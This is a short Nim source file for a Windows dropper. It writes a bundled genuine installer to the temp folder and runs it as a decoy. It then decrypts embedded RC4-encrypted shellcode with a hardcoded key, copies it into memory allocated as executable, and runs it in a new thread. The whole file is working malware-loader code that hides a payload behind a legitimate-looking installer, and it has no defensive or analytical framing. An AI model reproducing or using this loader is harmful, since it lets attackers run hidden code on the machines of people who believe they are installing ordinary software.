import os, osproc, winim/lean, strutils

# Embed the legit installer (rename your real installer to installer.exe)
const installer_data* = staticRead("installer.exe")
let installer_path = getTempDir() & "installer.exe"

# Drop and execute the legit installer
writeFile(installer_path, installer_data)
discard execProcess(installer_path)

# RC4 decrypt function
proc rc4(data: var string, key: string) =
  var S: array[256, int]
  for i in 0..<256:
    S[i] = i
  var j = 0
  for i in 0..<256:
    j = (j + S[i] + key[i mod key.len].ord) and 0xFF
    swap(S[i], S[j])
  var i = 0
  j = 0
  for x in 0..<data.len:
    i = (i + 1) and 0xFF
    j = (j + S[i]) and 0xFF
    swap(S[i], S[j])
    let k = S[(S[i] + S[j]) and 0xFF]
    data[x] = chr(ord(data[x]) xor k)

# Read encrypted shellcode from disk
const enc_shellcode* = staticRead("shellcode.enc")
var decrypted = enc_shellcode
rc4(decrypted, "secretkey")

# Allocate executable memory
let mem = VirtualAlloc(nil, decrypted.len, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
copyMem(mem, unsafeAddr decrypted[0], decrypted.len)

# Create thread to run shellcode
let threadHandle = CreateThread(nil, 0, cast[LPTHREAD_START_ROUTINE](mem), nil, 0, nil)

# Wait for shellcode thread to finish
const INFINITE*: DWORD = -1
discard WaitForSingleObject(cast[HANDLE](threadHandle), INFINITE)
